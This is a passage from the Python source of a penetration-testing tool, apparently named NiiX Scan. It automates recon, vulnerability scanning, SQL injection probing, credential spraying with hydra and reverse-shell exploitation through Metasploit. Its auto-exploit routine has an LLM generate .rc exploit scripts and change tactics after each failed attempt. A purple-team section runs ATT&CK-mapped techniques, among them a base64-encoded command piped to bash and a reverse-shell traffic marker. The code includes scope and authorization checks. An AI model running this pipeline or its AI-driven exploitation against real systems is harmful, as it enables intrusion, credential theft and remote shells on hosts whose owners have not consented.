            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(("0.0.0.0", p)); s.close()
            return p
        except OSError:
            continue
    return start

def notify(event: str):
    """Fire a webhook (Discord/Slack/generic) when configured in Settings."""
    try:
        url = load_cfg().get("webhook_url")
        if not url: return
        body = json.dumps({"content": event, "text": event}).encode()
        req = urllib.request.Request(url, data=body,
                headers={"Content-Type": "application/json"}, method="POST")
        urllib.request.urlopen(req, timeout=15).read()
    except Exception as e:
        msg_wrn(f"Webhook failed: {e}")

def db_run_changes(host: str, run_start: str):
    """What did THIS run discover? (ports/vulns/creds first seen after run_start)"""
    with db() as c:
        ports = c.execute("SELECT port,proto,service FROM ports WHERE host=? AND last_seen>=?",
                          (host, run_start)).fetchall()
        vulns = c.execute("SELECT vuln_id,severity,source FROM vulns WHERE host=? AND first_seen>=?",
                          (host, run_start)).fetchall()
        creds = c.execute("SELECT service,username FROM creds WHERE host=? AND first_seen>=?",
                          (host, run_start)).fetchall()
    return {"ports": ports, "vulns": vulns, "creds": creds}

_MASSCAN_HIT = re.compile(r"Discovered open port (\d+)/(tcp|udp) on (\S+)")

def masscan_sweep(target: str, ports: str = "1-10000") -> dict:
    """Fast full sweep with masscan. Returns {host: [ports]} (may be empty)."""
    found = {}
    if not shutil.which("masscan"):
        return found
    rate = active_preset()["masscan_rate"]
    cmd = ["sudo", "masscan", target, f"-p{ports}", f"--rate={rate}", "--open-only"]
    rc, out = run_scan(cmd, f"Masscan sweep → {target}:{ports}",
                       pct_fn=_pct_masscan, capture_key="masscan",
                       show_output=False, timeout=1200)
    for port, proto, host in _MASSCAN_HIT.findall(out):
        found.setdefault(host, []).append(int(port))
    return found

def nmap_vuln_scripts(target: str, ports: list):
    """Second pass: run nmap's 'vuln' NSE category against confirmed open ports."""
    if not ports or not shutil.which("nmap"):
        return
    plist = ",".join(str(p) for p in sorted(set(ports))[:200])
    xml = f"/tmp/niix_vuln_{int(time.time())}.xml"
    t = active_preset()["nmap_timing"]
    nmap_xml_scan(["nmap", t, "--script", "vuln", "-p", plist, target], xml,
                  f"Nmap vuln scripts → {target}:{plist[:40]}…",
                  pct_fn=_pct_nmap, capture_key="nmap_vuln", show_output=False)

def queue_sqlmap_from_findings(max_targets: int = 3):
    """Auto-run sqlmap against parameterized URLs spotted in earlier output."""
    sqlmap = "/opt/sqlmap/sqlmap.py"
    if not Path(sqlmap).exists():
        return
    urls = []
    for blob in SESSION["scan_results"].values():
        for m in re.finditer(r"https?://\S*\?\S+", blob):
            u = m.group(0).rstrip("'\")]},")
            if u not in urls and validate_url(u):
                urls.append(u)
    for u in urls[:max_targets]:
        _stage(f"Auto-SQLMap → {u[:70]}")
        rc, out = run_scan([sys.executable, sqlmap, "-u", u, "--batch", "--level=2",
                            "--risk=1", "--output-dir=/tmp/sqlmap_out"],
                           f"SQLMap → {u[:60]}", pct_fn=_pct_sqlmap,
                           capture_key="sqlmap", show_output=False, timeout=1800)
        if "is vulnerable" in out:
            db_add_vuln(urlparse(u).hostname or u, "SQLi",
                        f"SQL injection at {u[:80]}", "critical", "sqlmap",
                        u)

def wpscan_if_wordpress(target: str):
    """Auto-WPScan when WordPress is fingerprinted anywhere in the results."""
    if not shutil.which("wpscan"):
        return
    blob = " ".join(SESSION["scan_results"].values()).lower()
    if "wordpress" not in blob and "wp-content" not in blob:
        return
    url = target if target.startswith("http") else f"http://{target}"
    _stage("WordPress detected → WPScan")
    rc, out = run_scan(["wpscan", "--url", url, "--no-update", "--disable-tls-checks",
                        "-e", "vp,u1-5", "--format", "cli-no-colour"],
                       f"WPScan → {url}", capture_key="wpscan",
                       show_output=False, timeout=1800)
    for m in re.finditer(r"Title:\s*(.+)", out):
        sev = "high" if re.search(r"fixed in", out, re.IGNORECASE) else "medium"
        db_add_vuln(urlparse(url).hostname or url, "WPVuln",
                    m.group(1).strip()[:120], sev, "wpscan", url)

def spray_found_creds(host: str):
    """Try credentials already in the DB against SSH/FTP on this host (fast, few combos)."""
    creds = db_creds_for(host)
    if not creds or not shutil.which("hydra"):
        return
    pairs = f"/tmp/niix_creds_{int(time.time())}.txt"
    Path(pairs).write_text("\n".join(f"{u}:{p}" for _, u, p in creds[:10]))
    for svc in ("ssh", "ftp"):
        _stage(f"Credential spray ({svc}) with {min(len(creds),10)} known cred(s)")
        rc, out = run_scan(["hydra", "-C", pairs, "-t", "4", host, svc],
                           f"Hydra spray → {host} ({svc})", capture_key=f"spray_{svc}",
                           show_output=False, timeout=600)
        parse_hydra_creds(out)


# ══════════════════════════════════════════════════════════════════════════════
#  RECON PIPELINE  — chained, structured, DB-backed
# ══════════════════════════════════════════════════════════════════════════════
def _stage(name, ok=True):
    tag = f"{GR}►{R}" if ok else f"{DIM}·{R}"
    print(f"\n  {tag} {B}{name}{R}")

def _pipeline_single(target: str, auto: bool, run_start: str):
    """Run the full pipeline against ONE target. Returns True on completion."""
    SESSION["target"] = target
    host = urlparse(target).hostname or target
    is_domain = not re.match(r"^\d+\.\d+\.\d+\.\d+", host)
    db_add_host(host)

    # ── Stage 1: subdomain enumeration (domains only) ─────────────────
    targets = {host}
    if is_domain and shutil.which("subfinder"):
        _stage("Stage 1/6 · Subfinder — passive subdomains")
        _, out = run_scan(["subfinder","-d",host,"-silent"],
                          f"Subfinder → {host}", capture_key="subfinder",
                          show_output=False, timeout=300)
        subs = [l.strip() for l in out.splitlines()
                if re.match(r"^[a-z0-9.-]+\.[a-z]{2,}$", l.strip())]
        targets.update(subs[:25])
        msg_inf(f"{len(subs)} subdomains found; probing up to {min(len(subs),25)}.")
    else:
        _stage("Stage 1/6 · Subfinder — skipped", False)

    # ── Stage 2: httpx live web probe ──────────────────────────────────
    web_urls = []
    if shutil.which("httpx"):
        _stage("Stage 2/6 · httpx — live web services")
        hosts_file = f"/tmp/niix_hosts_{int(time.time())}.txt"
        Path(hosts_file).write_text("\n".join(sorted(targets)))
        _, out = run_scan(["httpx","-l",hosts_file,"-title","-status-code","-silent"],
                          f"httpx → {len(targets)} hosts", capture_key="httpx",
                          show_output=False, timeout=600)
        for line in out.splitlines():
            m = re.match(r"(https?://\S+)", line.strip())
            if m: web_urls.append(m.group(1))
        msg_inf(f"{len(web_urls)} live web service(s).")
    else:
        web_urls = [target if target.startswith("http") else f"http://{host}"]
        _stage("Stage 2/6 · httpx — skipped", False)

    # ── Stage 3: masscan fast sweep → nmap -sV on open ports only ─────
    open_ports = []
    if shutil.which("nmap"):
        _stage("Stage 3/6 · Port discovery + service detection")
        swept = masscan_sweep(host)          # {} when masscan missing/failed
        open_ports = swept.get(host, [])
        xml = f"/tmp/niix_pipe_{int(time.time())}.xml"
        p = active_preset()
        if open_ports:
            plist = ",".join(str(x) for x in sorted(set(open_ports))[:500])
            msg_inf(f"Masscan found {len(open_ports)} open port(s) — nmap probing only those.")
            nmap_xml_scan(["nmap","-sV","-sC",p["nmap_timing"],"-p",plist,
                           "--stats-every","5s",host] + p["nmap_evasion"],
                          xml, f"Nmap -sV → {host}", pct_fn=_pct_nmap,
                          capture_key="nmap", show_output=False)
        else:
            nmap_xml_scan(["nmap","-sV","-sC",p["nmap_timing"],"--top-ports","1000",
                           "--stats-every","5s",host] + p["nmap_evasion"],
                          xml, f"Nmap → {host}", pct_fn=_pct_nmap,
                          capture_key="nmap", show_output=False)
        open_ports = [r[0] for r in db_summary(host)["ports"]] or open_ports

        # Auto-escalation: nothing found on quick pass → full 65k sweep
        if not db_summary(host)["ports"] and preset_name() != "stealth":
            msg_wrn("No open ports on first pass — escalating to full 65535-port scan.")
            xml2 = f"/tmp/niix_full_{int(time.time())}.xml"
            nmap_xml_scan(["nmap","-sV",p["nmap_timing"],"-p-","--min-rate","2000",
                           "--stats-every","5s",host] + p["nmap_evasion"],
                          xml2, f"Nmap FULL → {host}", pct_fn=_pct_nmap,
                          capture_key="nmap_full", show_output=False, timeout=5400)

        # Targeted NSE vuln scripts on confirmed ports
        open_ports = [r[0] for r in db_summary(host)["ports"]]
        if open_ports:
            nmap_vuln_scripts(host, open_ports)
    else:
        _stage("Stage 3/6 · Nmap — skipped (not installed)", False)

    # ── Stage 4: parallel web offensive (nuclei ∥ gobuster ∥ testssl) ──
    def _nuclei():
        if not (shutil.which("nuclei") and web_urls): return
        jsonl = f"/tmp/niix_pipe_nuclei_{int(time.time())}.jsonl"
        urls_file = f"/tmp/niix_pipe_urls_{int(time.time())}.txt"
        Path(urls_file).write_text("\n".join(web_urls[:10]))
        run_scan(["nuclei","-l",urls_file,"-severity","critical,high,medium",
                  "-jsonl","-o",jsonl,"-silent"],
                 "Nuclei → web services", capture_key="nuclei",
                 show_output=False, timeout=1800)
        if Path(jsonl).exists():
            for line in Path(jsonl).read_text(errors="replace").splitlines():
                parse_nuclei_line(line, host)

    def _gobuster():
        if not (shutil.which("gobuster") and web_urls): return
        wl = _smart_wordlist(web_urls[0])
        if not Path(wl).is_file(): return
        p = active_preset()
        cmd = ["gobuster","dir","-u",web_urls[0],"-w",wl,"--no-color",
               "-t",p["gobuster_threads"]]
        if p["gobuster_delay"]: cmd += ["--delay", p["gobuster_delay"]]
        run_scan(cmd, f"Gobuster → {web_urls[0]}", capture_key="gobuster",
                 show_output=False, timeout=1800)

    def _testssl():
        bin_ = shutil.which("testssl.sh") or shutil.which("testssl")
        if not bin_: return
        tls_hosts = [u for u in web_urls if u.startswith("https")][:3]
        for u in tls_hosts:
            h = urlparse(u).netloc
            rc, out = run_scan([bin_,"--color","0","--fast",h],
                               f"testssl → {h}", capture_key=f"testssl_{h}",
                               show_output=False, timeout=900)
            for m in re.finditer(r"(CVE-\d{4}-\d{4,7})", out):
                db_add_vuln(urlparse(u).hostname or h, m.group(1), m.group(1),
                            "medium", "testssl")

    if web_urls:
        _stage("Stage 4/6 · Parallel web offensive (nuclei ∥ gobuster ∥ testssl)")
        threads = [threading.Thread(target=f, daemon=True) for f in (_nuclei, _gobuster, _testssl)]
        for t_ in threads: t_.start()
        for t_ in threads: t_.join()
    else:
        _stage("Stage 4/6 · Web offensive — skipped (no web services)", False)

    # ── Stage 5: targeted follow-ups (sqlmap, wpscan, cred spray) ─────
    _stage("Stage 5/6 · Targeted follow-ups")
    queue_sqlmap_from_findings()
    wpscan_if_wordpress(target)
    spray_found_creds(host)

    # ── Stage 6: run diff — what's NEW this run ───────────────────────
    changes = db_run_changes(host, run_start)
    print(f"\n{hline()}")
    info = db_summary(host)
    print(f"  {B}{WH}Pipeline summary for {host}:{R}  "
          f"{len(info['ports'])} open ports · {len(info['vulns'])} findings · "
          f"{len(info['creds'])} creds")
    if any(changes.values()):
        print(f"\n  {YL}{B}NEW this run:{R}  "
              f"{len(changes['ports'])} ports · {len(changes['vulns'])} findings · "
              f"{len(changes['creds'])} creds")
        for p_, pr, s in changes["ports"][:10]:
            print(f"    {GR}+{R} port {p_}/{pr} {s}")
        for vid, sev, src in changes["vulns"][:10]:
            print(f"    {OR}+{R} [{sev}] {vid} ({src})")
    msg_ok("All results stored in the findings DB and ready for AI analysis.")
    _checkpoint()
    return True


def recon_pipeline(target: str, auto: bool = False):
    """
    Chained recon against one target OR every target in a file (one per line).
    masscan→nmap handoff, parallel web stage, targeted follow-ups, run diff.
    """
    banner()
    print(f"\n  {CY}{B}[ 🔄  AUTO RECON PIPELINE ]{R}  target: {CY}{target}{R}")
    print(f"  {DIM}Preset: {preset_name()}   Proxy: "
          f"{'on' if load_cfg().get('proxychains') else 'off'}{R}\n")
    if not scope_guard(target):
        pause(); return False

    # Target-list file support
    targets = [target]
    if Path(target).is_file():
        targets = [l.strip() for l in Path(target).read_text().splitlines()
                   if l.strip() and not l.startswith("#")]
        in_scope = [t for t in targets if check_scope(t)]
        skipped = len(targets) - len(in_scope)
        if skipped:
            msg_wrn(f"{skipped} target(s) skipped — outside scope file.")
        targets = in_scope
        msg_inf(f"{len(targets)} target(s) queued from file.")
        if not targets:
            pause(); return False

    run_start = _now()
    for i, t in enumerate(targets, 1):
        if len(targets) > 1:
            print(f"\n  {MG}{B}━━ Target {i}/{len(targets)}: {t} ━━{R}")
        try:
            _pipeline_single(t, auto, run_start)
        except Exception as e:
            msg_err(f"Pipeline failed for {t}: {e}")
    if not auto: pause()
    return True


def full_auto(target: str):
    """One-shot: recon pipeline → AI triage (+ module verification) →
    reports (txt + HTML). Exploitation still requires explicit confirmation."""
    banner()
    print(f"\n  {PU}{B}[ ⚡  FULL AUTO MODE ]{R}\n")
    if not recon_pipeline(target, auto=True):
        return
    if not SESSION["api_key"]:
        msg_wrn("No Kimi API key — skipping AI analysis, reports will be DB-only.")
    else:
        _stage("AI triage — analysing all collected data")
        combined = "\n\n".join(f"=== {k} ===\n{v}" for k, v in SESSION["scan_results"].items())
        try:
            analysis = ai_analyse_scan(combined, "pipeline", SESSION["target"])
            SESSION["ai_report"] = analysis
            _stage("Verifying suggested Metasploit modules against local install")
            verify_analysis_modules(analysis)
            display_ai_analysis(analysis)
        except Exception as e:
            msg_err(f"AI analysis failed: {e}")
    _stage("Generating reports")
    try:
        if SESSION["api_key"]:
            save_report_menu()
        html = generate_html_report(SESSION["target"])
        msg_ok(f"HTML report → {html}")
    except Exception as e:
        msg_err(f"Report failed: {e}")
    if SESSION.get("ai_report", {}).get("vulnerabilities"):
        print()
        auto_x = False
        try: auto_x = bool(load_cfg().get("auto_exploit"))
        except Exception: pass
        if auto_x:
            auto_exploit(SESSION["target"], SESSION["ai_report"])
        elif confirm("Proceed to the step-through exploitation wizard now"):
            msf_pipeline(SESSION["target"], SESSION["ai_report"])
    info = db_summary(urlparse(SESSION["target"]).hostname or SESSION["target"])
    notify(f"NiiX Scan full-auto complete for {SESSION['target']}: "
           f"{len(info['ports'])} ports, {len(info['vulns'])} findings, "
           f"{len(info['creds'])} creds.")
    pause()


# ══════════════════════════════════════════════════════════════════════════════
#  AUTO-EXPLOITATION  — verified modules only, severity-gated, fully logged
# ══════════════════════════════════════════════════════════════════════════════
def auto_exploit(target: str, analysis: dict) -> int:
    """
    Automatically exploit vulnerabilities from the AI analysis.
    Safety rails (ALL must hold for every attempt):
      · session authorized + target in scope (enforced before this is called)
      · vuln has an msf_module AND it verifies against the local Metasploit
      · severity >= threshold from Settings → auto_exploit_severity
        (default: critical only)
    Every attempt's outcome is logged to the findings DB and fed back to the AI.
    Returns the number of sessions obtained.
    """
    banner()
    print(f"\n  {RD}{B}[ ⚔   AUTO-EXPLOITATION ]{R}  target: {CY}{target}{R}\n")

    if not SESSION.get("authorized"):
        msg_err("Not authorized."); pause(); return 0
    if not shutil.which("msfconsole"):
        msg_err("msfconsole not installed — cannot auto-exploit."); pause(); return 0
    if not SESSION["api_key"]:
        msg_err("No Kimi API key — needed to generate exploit scripts."); pause(); return 0

    try:
        threshold = load_cfg().get("auto_exploit_severity", "critical")
    except Exception:
        threshold = "critical"
    order = ["critical", "high", "medium", "low", "info"]
    min_idx = order.index(threshold) if threshold in order else 0

    candidates = [v for v in analysis.get("vulnerabilities", [])
                  if v.get("msf_module")
                  and v.get("severity", "info") in order[:min_idx + 1]]
    # Most promising first: severity, then previously verified modules
    candidates.sort(key=lambda v: (order.index(v.get("severity", "info")),
                                   v.get("_msf_verified") is not True))

    if not candidates:
        msg_wrn(f"No vulnerabilities with an MSF module at severity "
                f"'{threshold}' or above."); pause(); return 0

    print(f"  {B}{WH}Candidates ({len(candidates)}):{R}  threshold ≥ {YL}{threshold}{R}\n")
    for v in candidates:
        print(f"    {CY}●{R} {v.get('severity','?').upper():<10} {v.get('id','?'):<26} "
              f"{DIM}{v.get('msf_module')}{R}")
    print()

    lhost = _get_local_ip()
    lport = _find_free_port(4444)
    msg_inf(f"LHOST auto-detected: {lhost} · LPORT auto-selected: {lport}")
    if not re.match(r"^(\d{1,3}\.){3}\d{1,3}$", lhost) or lhost.startswith(("10.","192.168.","172.16.")):
        msg_wrn(f"LHOST {lhost} looks like a private/NAT address — reverse shells from")
        msg_wrn("external targets can't reach it. Set up a public listener or VPN first.")
    sessions = 0
    max_attempts = 3

    for i, vuln in enumerate(candidates, 1):
        mod = vuln["msf_module"]
        print(f"\n  {RD}{B}[{i}/{len(candidates)}] {vuln.get('id','?')}{R}  {DIM}{mod}{R}")

        # Rail 1: ground-truth the module exists locally
        ver = verify_msf_module(mod)
        if ver is False:
            msg_err("Module NOT found in local Metasploit — skipping (AI hallucination?).")
            SESSION["exploit_log"].append({"vuln_id": vuln.get("id"), "module": mod,
                "outcome": "skipped-unverified", "note": "module not in local msf", "when": _now()})
            continue

        # Retry loop: each failed attempt is fed back to the AI, which must
        # change strategy (different payload/options/module) on the next try.
        got_session = False
        for attempt in range(1, max_attempts + 1):
            _stage(f"Attempt {attempt}/{max_attempts} — planning + generation")
            try:
                plan = ai_step_plan(vuln, lhost)
            except Exception as e:
                msg_err(f"Plan generation failed: {e}"); break
            rc_content = plan.get("rc_script", "").strip()
            if not rc_content or "use " not in rc_content:
                msg_err("AI returned an empty/invalid .rc — aborting this vuln."); break
            rc_content = re.sub(r"(?im)^\s*set\s+lport\s+\d+", f"set LPORT {lport}",
                                rc_content)
            if "LPORT" not in rc_content.upper():
                rc_content += f"\nset LPORT {lport}\n"
            rc_path = _save_rc(rc_content)

            _stage(f"Executing via msfconsole (timeout 15 min)")
            out, got_session = run_rc_captured(str(rc_path), timeout=900)

            outcome = "session" if got_session else "failed"
            tail = " ".join(out.splitlines()[-3:])[:200] if out else ""
            SESSION["exploit_log"].append({"vuln_id": vuln.get("id"), "module": mod,
                "attempt": attempt, "outcome": outcome, "note": tail, "when": _now()})
            _checkpoint()

            if got_session:
                msg_ok("SESSION OPENED — check msfconsole for the live shell.")
                break
            msg_wrn(f"Attempt {attempt} failed: {DIM}{tail}{R}")
            if attempt < max_attempts:
                msg_inf("Feeding failure back to Kimi — adapting strategy …")

        db_add_vuln(urlparse(target).hostname or target, vuln.get("id", "?"),
                    vuln.get("title", ""), vuln.get("severity", "info"),
                    "auto-exploit", f"{'session' if got_session else 'failed'}")

        if got_session:
            sessions += 1
            notify(f"NiiX Scan: SESSION opened on {target} via {mod} "
                   f"({vuln.get('id','?')})")

    print(f"\n{hline()}")
    msg_ok(f"Auto-exploitation complete: {sessions} session(s) from "
           f"{len(candidates)} candidate(s).")
    pause()
    return sessions


# ══════════════════════════════════════════════════════════════════════════════
#  DETECTION VALIDATION  (purple team)
#  Runs KNOWN, documented attack techniques — each mapped to MITRE ATT&CK —
#  so you can verify your monitoring actually fires. Techniques never adapt
#  or evade: the point is a fixed, repeatable test your detections can learn.
# ══════════════════════════════════════════════════════════════════════════════
def _det_marker(tech_id: str, run_id: str) -> str:
    """Unique per-run token embedded in traffic so you can grep your SIEM."""
    return f"NIIXDET-{run_id}-{tech_id}"

def _det_run(cmd, marker, timeout=120, shell=False):
    """Execute one technique; returns (ran_ok, note)."""
    try:
        r = subprocess.run(cmd, capture_output=True, text=True,
                           timeout=timeout, shell=shell)
        return True, (r.stdout or r.stderr or "").strip()[-200:]
    except FileNotFoundError:
        return False, f"tool missing: {cmd[0]}"
    except subprocess.TimeoutExpired:
        return True, "completed (timed out — expected for some techniques)"
    except Exception as e:
        return False, str(e)[:160]

def _tt_ssh_brute(target, marker):
    if not shutil.which("hydra"): return False, "hydra not installed"
    users = f"/tmp/niix_det_u_{os.getpid()}.txt"
    Path(users).write_text("\n".join(f"dettest{i}" for i in range(5)))
    pw = f"/tmp/niix_det_p_{os.getpid()}.txt"
    Path(pw).write_text("dettest123\n")
    return _det_run(["hydra","-L",users,"-P",pw,"-t","2","-f",target,"ssh"],
                    marker, timeout=120)

def _tt_beacon(target, marker):
    """Beacon-like pattern: 6 identical HTTP GETs at a fixed 5s interval."""
    note = ""
    for _ in range(6):
        ok, note = _det_run(["curl","-s","-A",marker,"-o","/dev/null",
                             "-m","8", f"http://{target}/"], marker, timeout=15)
        time.sleep(5)
    return True, note

def _tt_dns_tunnel(target, marker):
    dom = target if re.search(r"[a-zA-Z]", target) else "example.com"
    note = ""
    for _ in range(3):
        long_sub = (marker.lower().replace("-","") + os.urandom(8).hex())[:60]
        ok, note = _det_run(["dig","+short",f"{long_sub}.{dom}"], marker, timeout=20)
    return True, note

def _tt_eicar(target, marker):
    """Industry-standard safe malware-detection test file."""
    return _det_run(["curl","-s","-o","/tmp/niix_eicar.com.txt",
                     "https://secure.eicar.org/eicar.com.txt"], marker, timeout=60)

def _tt_revsh_pattern(target, marker):
    """Connects and sends a shell-banner marker string, then disconnects.
    Simulates reverse-shell traffic WITHOUT executing any shell."""
    try:
        import socket
        s = socket.create_connection((target, 4444), timeout=5)
        s.sendall(f"/bin/sh -i # {marker}\n".encode())
        s.close()
        return True, "sent shell-banner marker to :4444"
    except OSError as e:
        return False, f"no listener on {target}:4444 ({e}) — start one with: nc -lvnp 4444"

def _tt_encoded_cmd(target, marker):
    if target not in ("127.0.0.1", "localhost"):
        return False, "local-only technique — run against localhost"
    b64 = __import__("base64").b64encode(f"echo {marker}".encode()).decode()
    return _det_run(f"echo {b64} | base64 -d | bash", marker, shell=True)

DET_TECHNIQUES = [
    {"id":"nmap_syn",     "attack":"T1046",     "name":"SYN port scan (fast)",
     "cmd": lambda t,m: ["nmap","-sS","-F",t], "needs":"nmap"},
    {"id":"nmap_slow",    "attack":"T1046",     "name":"Slow/low-and-slow scan (-T1)",
     "cmd": lambda t,m: ["nmap","-sS","-T1","--max-retries","1","-p","1-50",t], "needs":"nmap"},
    {"id":"nmap_frag",    "attack":"T1046",     "name":"Fragmented-packet scan (-f)",
     "cmd": lambda t,m: ["nmap","-sS","-f","-F",t], "needs":"nmap"},
    {"id":"nmap_decoy",   "attack":"T1046",     "name":"Decoy scan (-D RND:5)",
     "cmd": lambda t,m: ["nmap","-sS","-D","RND:5","-F",t], "needs":"nmap"},
    {"id":"nmap_fin",     "attack":"T1046",     "name":"FIN stealth scan (-sF)",
     "cmd": lambda t,m: ["nmap","-sF","-F",t], "needs":"nmap"},
    {"id":"nmap_version", "attack":"T1595.001", "name":"Service version probing (-sV)",
     "cmd": lambda t,m: ["nmap","-sV","--top-ports","100",t], "needs":"nmap"},
    {"id":"web_beacon",   "attack":"T1071.001", "name":"HTTP beacon pattern (fixed-interval GETs)",
     "fn": _tt_beacon},
    {"id":"dns_tunnel",   "attack":"T1071.004", "name":"DNS tunnel pattern (long random subdomains)",
     "fn": _tt_dns_tunnel},
    {"id":"eicar",        "attack":"T1105",     "name":"EICAR test-file download (malware detonation test)",
     "fn": _tt_eicar},
    {"id":"revsh_marker", "attack":"T1059",     "name":"Reverse-shell traffic pattern (marker only)",
     "fn": _tt_revsh_pattern},
    {"id":"ssh_brute",    "attack":"T1110.001", "name":"SSH brute-force pattern (5 bogus logins)",
     "fn": _tt_ssh_brute},
    {"id":"encoded_cmd",  "attack":"T1027",     "name":"Base64-encoded command execution (localhost)",
     "fn": _tt_encoded_cmd},
]

def _det_db_init():
    with db() as c:
        c.execute("""CREATE TABLE IF NOT EXISTS detval(
            run_id TEXT, tech_id TEXT, attack TEXT, name TEXT,
            status TEXT, marker TEXT, ts TEXT)""")

def detection_validation(target: str):
    """Run known techniques, record what your monitoring caught, draft rules
    for whatever it missed."""
    banner()
    print(f"\n  {MG}{B}[ 🛡   DETECTION VALIDATION — PURPLE TEAM MODE ]{R}\n")
    print(f"  {DIM}Runs KNOWN, ATT&CK-mapped techniques against your own systems.")
    print(f"  Each run embeds a unique marker so you can find it in your SIEM/EDR.{R}\n")

    if not scope_guard(target):
        pause(); return
    _det_db_init()
    run_id = datetime.datetime.now().strftime("%H%M%S")

    print(f"  {B}{WH}Available techniques:{R}\n")
    for i, t in enumerate(DET_TECHNIQUES, 1):
        print(f"    {CY}{i:>2}{R})  {t['attack']:<10} {t['name']}")
    sel = ask("\nRun which? (all / comma list)", "all")
    if sel.strip().lower() == "all":
        chosen = DET_TECHNIQUES
    else:
        chosen = [DET_TECHNIQUES[int(n)-1] for n in sel.split(",")
                  if n.strip().isdigit() and 1 <= int(n) <= len(DET_TECHNIQUES)]
    if not chosen:
        msg_err("Nothing selected."); pause(); return

    results = []
    for tech in chosen:
        marker = _det_marker(tech["id"], run_id)
        _stage(f"{tech['attack']} · {tech['name']}")
        if tech.get("needs") and not shutil.which(tech["needs"]):
            msg_wrn(f"skipped — {tech['needs']} not installed")
            results.append({**tech, "status":"skipped", "marker":marker}); continue
        if "fn" in tech:
            ok, note = tech["fn"](target, marker)
        else:
            ok, note = _det_run(tech["cmd"](target, marker), marker)
        print(f"    {DIM}marker: {marker}{R}")
        if note: print(f"    {DIM}{note}{R}")
        results.append({**tech, "status":"ran" if ok else "failed",
                        "marker":marker, "ts":_now()})
        time.sleep(1)

    # ── Detection check ────────────────────────────────────────────────
    print(f"\n{hline()}")
    print(f"  {B}{WH}Detection check.{R} For each technique, check your SIEM/EDR/firewall")
    print(f"  for the marker string, then record the result.\n")
    for r in results:
        if r["status"] != "ran": continue
        ans = ask(f"  [{r['attack']}] {r['name'][:48]} — detected? (y/n/u)", "u").lower()
        r["status"] = {"y":"detected","n":"MISSED"}.get(ans, "unknown")
        with db() as c:
            c.execute("INSERT INTO detval VALUES(?,?,?,?,?,?,?)",
                      (run_id, r["id"], r["attack"], r["name"],
                       r["status"], r["marker"], r.get("ts", _now())))
    _checkpoint()

    # ── Matrix ─────────────────────────────────────────────────────────
    print(f"\n  {B}{WH}RESULTS MATRIX — run {run_id}{R}\n")
    print(f"  {'Technique':<46} {'ATT&CK':<11} Result")
    print(f"  {'─'*46} {'─'*11} {'─'*10}")
    for r in results:
        col = {"detected":GR,"MISSED":RD,"unknown":YL}.get(r["status"], DIM)
        print(f"  {r['name'][:46]:<46} {r['attack']:<11} {col}{r['status']}{R}")

    missed = [r for r in results if r["status"] == "MISSED"]

    # ── Draft detection content for gaps ───────────────────────────────
    if missed and SESSION["api_key"] and confirm(
            f"\nDraft Sigma/Suricata rules for the {len(missed)} missed technique(s) with Kimi"):
        _draft_detection_rules(missed, target, run_id)
    elif missed:
        msg_wrn(f"{len(missed)} gap(s) — set a Kimi API key to auto-draft detection rules.")

    _save_detval_report(results, target, run_id)
    pause()


_SYS_DETRULE = """You are a detection engineer. Given an attack technique (with MITRE
ATT&CK ID) that a defender's monitoring FAILED to detect, draft:
1. A Sigma rule (YAML) detecting it
2. A Suricata/Snort rule if network-observable (or a comment why not applicable)
Rules must be specific enough to avoid false positives, reference the ATT&CK
ID in tags, and include a 'falsepositives' section. Output ONLY the two rule
blocks separated by a line containing exactly: ---SURICATA---"""


def _draft_detection_rules(missed: list, target: str, run_id: str):
    out_dir = Path(load_cfg().get("output_dir","~/niixscan-results")).expanduser()
    out_dir.mkdir(parents=True, exist_ok=True)
    for r in missed:
        spinner_start(f"Kimi drafting detection for {r['attack']} …")
        try:
            resp = _kimi_request(_SYS_DETRULE,
                f"Technique: {r['name']}\nATT&CK: {r['attack']}\n"
                f"Test marker used: {r['marker']}\nTarget environment: {target}",
                max_tokens=2500)
            spinner_stop(f"Rules drafted for {r['attack']}.")
        except Exception as e:
            spinner_stop(f"Failed: {e}"); continue
        sigma, _, suricata = resp.partition("---SURICATA---")
        base = out_dir / f"detrule_{r['id']}_{run_id}"
        Path(str(base) + ".sigma.yml").write_text(sigma.strip() + "\n")
        if suricata.strip():
            Path(str(base) + ".suricata.rules").write_text(suricata.strip() + "\n")
        msg_ok(f"Saved → {base}.sigma.yml"
               f"{' + .suricata.rules' if suricata.strip() else ''}")
        print(f"  {DIM}Review, tune to your environment, deploy, then re-run "
              f"this module to confirm the rule fires.{R}")


def _save_detval_report(results: list, target: str, run_id: str):
    out_dir = Path(load_cfg().get("output_dir","~/niixscan-results")).expanduser()
    out_dir.mkdir(parents=True, exist_ok=True)
    p = out_dir / f"detection_validation_{run_id}.txt"
    lines = [f"Detection Validation — target {target} — run {run_id}",
             f"Generated {_now()}", "",
             f"{'Technique':<46} {'ATT&CK':<11} {'Result':<10} Marker"]
    for r in results:
        lines.append(f"{r['name'][:46]:<46} {r['attack']:<11} {r['status']:<10} {r['marker']}")
    gaps = [r for r in results if r["status"] == "MISSED"]
    lines += ["", f"Detection gaps: {len(gaps)}",
              "Next step: deploy drafted rules, then re-run and confirm "
              "previous gaps now show 'detected'."]
    p.write_text("\n".join(lines))
    msg_ok(f"Report saved → {p}")


# ══════════════════════════════════════════════════════════════════════════════
#  CRON SCHEDULING  — recurring automated scans
# ══════════════════════════════════════════════════════════════════════════════
def schedule_menu():
    banner()
    print(f"\n  {YL}{B}[ ⏰  SCHEDULE AUTOMATED SCANS ]{R}\n")
    script = Path(sys.argv[0]).resolve()
    print(f"  Existing niixscan cron entries:")
    try:
        cur = subprocess.run(["crontab","-l"], capture_output=True, text=True)
        lines = [l for l in cur.stdout.splitlines() if "niixscan" in l]
        print("    " + ("\n    ".join(lines) if lines else "(none)"))
    except Exception as e:
        msg_wrn(f"Cannot read crontab: {e}"); lines = []
    print(f"\n  {CY}1{R}) Add daily full-auto scan")
    print(f"  {CY}2{R}) Add weekly full-auto scan (Mon 02:00)")
    print(f"  {CY}3{R}) Remove all niixscan entries")
    print(f"  {CY}0{R}) Back\n")
    ch = input(f"  {CY}»{R} ").strip()
    if ch in ("1", "2"):
        target = ask("Target (must be in your scope file)", SESSION["target"] or "")
        if not target or not check_scope(target):
            msg_err("Target missing or out of scope — refusing to schedule."); pause(); return
        sched = "0 2 * * *" if ch == "1" else "0 2 * * 1"
        (Path.home() / "niixscan-results").mkdir(parents=True, exist_ok=True)
        entry = (f"{sched} cd {script.parent} && /usr/bin/env python3 {script} "
                 f"--auto {shlex.quote(target)} --i-have-permission "
                 f">> {Path.home()}/niixscan-results/cron.log 2>&1  # niixscan-auto")
        try:
